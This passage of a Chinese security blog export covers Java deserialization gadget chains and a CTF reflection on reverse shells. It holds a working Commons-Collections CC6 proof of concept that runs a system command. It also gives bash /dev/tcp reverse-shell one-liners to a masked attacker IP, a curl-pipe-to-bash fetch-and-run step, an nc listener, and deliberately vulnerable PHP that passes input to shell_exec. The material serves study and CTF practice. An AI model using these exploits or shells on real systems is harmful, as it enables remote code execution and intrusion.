class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">bclass</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bclass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>cc6</title>
    <url>/2025/03/24/cc6/</url>
    <content><![CDATA[<p>   之前复现了java cc1链子 </p>
<p>顺便在这进行一个总结</p>
<h4 id="核心武器：反射万能钥匙（InvokerTransformer）"><a href="#核心武器：反射万能钥匙（InvokerTransformer）" class="headerlink" title="核心武器：反射万能钥匙（InvokerTransformer）"></a><strong>核心武器：反射万能钥匙（<code>InvokerTransformer</code>）</strong></h4><p><strong>比喻</strong>：<code>InvokerTransformer</code>类像一把万能钥匙，能通过反射调用任何方法。比如用钥匙打开“Runtime类”的锁，执行<code>exec(&quot;calc&quot;)</code>弹计算器</p>
<h4 id="流水线组装：串联工具人（ChainedTransformer）"><a href="#流水线组装：串联工具人（ChainedTransformer）" class="headerlink" title="流水线组装：串联工具人（ChainedTransformer）"></a><strong>流水线组装：串联工具人（<code>ChainedTransformer</code>）</strong></h4><p><strong>比喻</strong>：为了绕过限制，攻击者需要多个“工具人”协作。<code>ChainedTransformer</code>就像一个流水线，把多个操作串联起来：</p>
<p>工具人A：先拿到<code>Runtime</code>对象（<code>ConstantTransformer</code></p>
<p>工具人B：用万能钥匙调用<code>exec</code>方法（<code>InvokerTransformer</code>）</p>
<p><strong>原理</strong>：把这两个工具人按顺序放进<code>ChainedTransformer</code>，执行时会先获取<code>Runtime</code>对象，再调用<code>exec</code>方法。</p>
<h4 id="触发机关：改造地图（TransformedMap）"><a href="#触发机关：改造地图（TransformedMap）" class="headerlink" title="触发机关：改造地图（TransformedMap）"></a><strong>触发机关：改造地图（<code>TransformedMap</code>）</strong></h4><p><strong>比喻</strong>：<code>TransformedMap</code>是一个被魔改的地图，当地图中的值被修改时（比如调用<code>setValue</code>），会自动触发流水线上的工具人</p>
<h4 id="点火开关：反序列化入口（AnnotationInvocationHandler）"><a href="#点火开关：反序列化入口（AnnotationInvocationHandler）" class="headerlink" title="点火开关：反序列化入口（AnnotationInvocationHandler）"></a><strong>点火开关：反序列化入口（<code>AnnotationInvocationHandler</code>）</strong></h4><p><strong>比喻</strong>：<code>AnnotationInvocationHandler</code>是Java自带的“快递拆包员”，反序列化时会自动执行<code>readObject</code>方法（拆包裹逻辑）。攻击者把魔改地图塞进它的<code>memberValues</code>属性</p>
<p><strong>触发流程</strong>：</p>
<p>反序列化时，<code>readObject</code>方法遍历地图中的键值对</p>
<p>遍历到某个键值对时，调用<code>setValue</code>修改值，触发魔改地图的机关</p>
<ul>
<li>机关启动流水线工具人，最终弹计算器。</li>
</ul>
<h3 id="高版本jdk的修改"><a href="#高版本jdk的修改" class="headerlink" title="高版本jdk的修改"></a>高版本jdk的修改</h3><p>在jdk8u_71之后，AnnotationInvocationHandler类被重写了，修改了readObject方法，里面没有了setValue方法。</p>
<p>通过</p>
<p>ChainedTransformer的transform方法的用法，定位到LazyMap的get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>逻辑 </p>
<p>检查键是否存在，不存在时创建值并存储，存在时直接返回。</p>
<p>接着寻找入口点</p>
<h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TiedMapEntry的hashCode方法调用了getValue，getValue调用了get方法，所以可以用TiedMapEntry的hashCode方法调用LazyMap的get方法</p>
<p>接下来寻找谁调用了hashCode方法</p>
<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>通过之前对<a href="https://mp.weixin.qq.com/s/yby-SU4vfxPQFJdBS2TMtQ">URLDNS链</a>的研究可知，HashMap的readObject方法有如下这行语句</p>
<p>putVal(hash(key), key, value, false, false);</p>
<p>而HashMap的hash方法调用了hashCode方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而key的值是从readObject获取的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br></pre></td></tr></table></figure>

<p>序列化时可以用HashMap的put方法传key和value</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>但是hashmap的put会提前走完流程 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于HashMap的put方法会导致提前调用hash方法，从而在序列化前就命令执行，所以这里修改一下代码。</p>
<p>这里选择在新建LazyMap对象的时候，随便传入一个Transformer对象，等put完之后再通过反射修改回ChainedTransformer对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>反射修改lazymap的factory的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class; <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>); factoryField.setAccessible(<span class="literal">true</span>); factoryField.set(lazymap, ct);</span><br></pre></td></tr></table></figure>

<p>利用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">    TiedMapEntry.hashCode()</span><br><span class="line">    TiedMapEntry.getValue()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap, ct);</span><br><span class="line"></span><br><span class="line">        serial(hashMap);</span><br><span class="line">        unserial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn2024的一些反思</title>
    <url>/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/</url>
    <content><![CDATA[<h3 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h3><p>reverse shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<span id="more"></span><!-- more --><!-- more -->

<p>正向连接</p>
<p>就是我们客户端连服务器</p>
<p>我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接</p>
<p>反向连接</p>
<p>就是让服务器连我们</p>
<p>一般适用于</p>
<ul>
<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>
<li>目标机端口被占用。</li>
<li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li>
<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的</li>
<li>向web里面的话有可能出现在rce当中过滤的函数实在太多，我们只能去实现反向连shell</li>
</ul>
<h3 id="常见的方式"><a href="#常见的方式" class="headerlink" title="常见的方式"></a><strong>常见的方式</strong></h3><ul>
<li><p>Bash反弹shell</p>
</li>
<li><p>首先我们先了解下Linux的连接符号和重定向</p>
</li>
<li><p><strong>什么是重定向：</strong></p>
</li>
<li><p>Linux中的重定向就是<strong>将原本要输出到屏幕中的数据信息,重新指向某个特定文件当中</strong>，或者定向到黑洞文件（&#x2F;dev&#x2F;null）中。</p>
</li>
<li><p><strong>重定向的作用:</strong></p>
<ul>
<li><p>当屏幕输出的信息很重要,希望保存时</p>
</li>
<li><p>后台执行的程序一般都会有输出，不希望它输出干扰到终端</p>
</li>
<li><p>执行定时备份任务，希望将备份结果保留下来时</p>
</li>
<li><p>执行一些命令,会提示一些报错信息,可以直接将报错丢弃。</p>
</li>
<li><p>执行命令时希望将报错和正确内容区分在不同文件中时（日志）</p>
</li>
<li><ol>
<li><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a><strong>文件描述符</strong></h2></li>
</ol>
</li>
<li><blockquote>
<ol>
<li>文件描述符是IO重定向中的重要概念。文件描述符使用数字表示，它指明了数据的流向特征。</li>
</ol>
</blockquote>
</li>
</ul>
</li>
</ul>
<p>在Linux中我们分别使用描述符0，1，2表示</p>
<p>这三个默认的符号文件分别是终端字符设备的软连接&#x2F;dev&#x2F;stdin、&#x2F;dev&#x2F;stdout、&#x2F;dev&#x2F;srderr</p>
<p>表示标准输入、标准输出、和报错</p>
<p>当进程操作一个文件时：</p>
<p>首先程序是无法直接访问硬件，需要借助内核来访问文件</p>
<p>而内核kernel需要利用文件描述（file descriptor）来访问</p>
<p>总结：进程使用文件描述符来管理打开的文件对应关系</p>
<p><strong>通常程序访问一个文件至少会打开三个标准文件，分别是标准输入，<strong><strong>标准输出</strong></strong>，错误输出</strong></p>
<p><strong>进程将从标准输入中的到数据，将正常输出打印至屏幕终端，将错误的输出信息也打印至屏幕终端</strong></p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h2><p>我们使用&gt;或者&gt;&gt;时符号<strong>左边</strong>表示文件描述符，没有的话默认<strong>是1</strong>（标准输出）符号右边可以是文件也可以是输出设备（linux中万物都是文件，且设备也是文件）<strong>当使用&gt;时，会判断右边的文件存不存在，如果存在的话就先删除，然后创建一个新的文件，不存在的话则直接创建。但是当使用&gt;&gt;进行追加时，则不会删除原来已经存在的文件</strong></p>
<p>简单用法就不举例子了</p>
<p>高级用法：</p>
<p>#将错误输出信息关闭掉，控制台只打印了标准输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;&amp;-</span><br></pre></td></tr></table></figure>

<p>this is a.txt</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>this is a.txt</p>
<p>#&amp;[n] 代表是已经存在的文件描述符，&amp;1 代表输出 &amp;2代表错误输出&amp;-代表关闭与它绑定的描述符</p>
<p>#&#x2F;dev&#x2F;null 这个设备，是linux 中黑洞设备，什么信息只要输出给这个设备，都会给吃掉</p>
<p>#关闭所有输出</p>
<p>#关闭 1 ，2 文件描述符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 1&gt;&amp;- 2&gt;&amp;-</span><br></pre></td></tr></table></figure>

<p>#将1,2 输出转发给&#x2F;dev&#x2F;null设备</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[chengmo@centos5 shell]$ ls test.sh test1.sh  2&gt;/dev/null 1&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>#将标准输出fd&#x3D;1重定向到&#x2F;dev&#x2F;null文件，然后将fd&#x3D;2重定向到fd&#x3D;1所绑定的&#x2F;dev&#x2F;null文件。这种常用文件描述符前必须有个 &amp;, 否则2&gt;1就变成将错误输出输出到一个名为1的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]<span class="built_in">cat</span> 1.txt 2.txt &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>#&amp;&gt;代表将标准输出与标准错误重定向到&#x2F;dev&#x2F;null文件</p>
<h3 id="输入重定向实例"><a href="#输入重定向实例" class="headerlink" title="输入重定向实例"></a><strong>输入重定向实例</strong></h3><p>我们使用<code>&lt;</code>对输入做重定向，<strong>如果符号左边没有写值，那么默认就是0。</strong> <strong>格式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command-line [n] &lt;文件</span><br></pre></td></tr></table></figure>

<p>命令默认从键盘获得的输入，使用输入重定向改成从文件，或者其它打开文件以及设备输入。执行这个命令，将标准输入0，与文件或设备绑定，将由它进行输入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat &gt; stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">[root@sccprocddev02:/home/upro01]cat stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br></pre></td></tr></table></figure>

<p>#这里使用ctrl+d 或者ctrl+c退出输入</p>
<p>#从标准输入[键盘]获得数据，然后输出给stdout.txt文件</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout2.txt &lt; stdout.txt</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat stdout2.txt</p>
<p>this is stdout.txt</p>
<p>#从stdout.txt获得输入数据，然后输出给文件stdout2.txt</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout3.txt &lt;&lt; end</p>
<blockquote>
<p>first line</p>
<p>second line</p>
<p>end</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]#cat stdout3.txt</p>
<p>first line</p>
<p>second line</p>
<p>#&lt;&lt; 这个连续两个小符号， 他代表的是[结束的输入字符]的意思。这样当空行输入end字符时，自动退出输入，不需要使用ctrl+d或者ctrl+c退出</p>
</blockquote>
<p>先简单了解下这两个</p>
<p>回到Bash反弹shell</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.<span class="number">72/2333</span> <span class="number">0</span>&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>或</p>
<p>bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1”    #更稳定</p>
<p>#bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机端口 0&gt;&amp;1</p>
<p>&amp;[n] 代表是已经存在的文件描述符，&amp;1 代表输出 &amp;2代表错误输出&amp;-代表关闭与它绑定的描述符</p>
<p>所以这段指令就是在目标及和主机之间进行一个bash的shell交互环境，在主机上从键盘输出到0（也就是输出到目标机上比如我们执行指令），目标机进行输出（收到主机的指令，进行输出到主机上面）从而形成回路</p>
<p>然后攻击机在本地监听就可以了</p>
<p>nc -lvvn 2333</p>
<p>Curl配合Bash反弹shell首先，在攻击者vps的web目录里面<strong>创建一个index文件</strong>（index.php或index.html），内容如下</p>
<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1</p>
<p>#使用 bash -i 命令启动一个交互式的 Bash shell。然后将 shell 的标准输入、标准输出和标准错误重定向到 TCP 连接上,连接到 IP 地址 47.xxx.xxx.72 的 2333 端口</p>
<p>并开启2333端口的监听然后再目标机上执行如下，即可反弹shell：</p>
<p>curl 47.xxx.xxx.72|bash</p>
<p>#使用curl指令从 IP 地址 47.xxx.xxx.72 下载一个文件或脚本。然后将下载的内容通过管道符 | 传递给 bash 命令,也就是执行这个下载的脚本。</p>
<p><code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
<p>基本了解了bash的反弹shell之后我们找题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;  <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  &#125;  <span class="keyword">else</span>&#123;     <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);       &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);   <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这个题目的关键函数</p>
<p><strong>strCheck()函数</strong>是用来检查输入的命令是否包含一些危险的关键字,比如;、&amp;、$等。如果包含这些关键字,函数会直接退出并输出”i hate this”。</p>
<p>cmd进行传参传给strCheck()</p>
<p><strong>如果strCheck()函数没有拦截该命令,代码会使用</strong></p>
<p><strong>shell_exec()函数执行该命令</strong></p>
<p>shell_exec()是PHP中用于执行系统命令的一个函数。它的作用是执行一个外部程序或命令,并将该命令的输出以字符串的形式返回。</p>
<p>用了shell_exec函数执行命令，但是不能回显，这里可以用重定向将命令写入到指定的文件</p>
<p>利用重定向执行ls &#x2F; 输出到1.txt</p>
<p>进入1.txt</p>
<p>执行同样操作</p>
<p>看到flag，下面将flag进行输出</p>
<p>再次访问1.txt得到flag</p>
<h2 id="CISCN2024-simple-php"><a href="#CISCN2024-simple-php" class="headerlink" title="CISCN2024 simple_php"></a><strong>CISCN2024 simple_php</strong></h2><p>今年国赛的一道题目</p>
<p>属实让我一脸懵逼        </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$cmd</span> = escapeshellcmd<span class="variable">$$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span 